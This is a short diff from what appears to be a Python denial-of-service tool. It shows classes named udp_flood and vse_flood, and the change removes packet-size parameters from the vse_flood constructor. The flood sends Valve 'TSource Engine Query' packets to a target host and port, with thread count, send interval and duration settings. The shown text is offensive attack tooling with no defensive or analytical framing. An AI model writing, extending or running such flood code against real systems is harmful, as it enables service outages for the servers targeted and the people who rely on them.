@@ -197,7 +197,7 @@ class udp_flood:
   return a
   
 class vse_flood:
- def __init__(self,u,p=80,threads_daemon=True,interval=0.001,min_size=10,max_size=10,connection=True,duration=60,threads=1,limiting=True,logs=False):
+ def __init__(self,u,p=80,threads_daemon=True,interval=0.001,connection=True,duration=60,threads=1,limiting=True,logs=False):
   self.target=u
   self.port=p
   self.payload=b'\xff\xff\xff\xffTSource Engine Query\x00' # read more at https://developer.valvesoftware.com/wiki/Server_queries
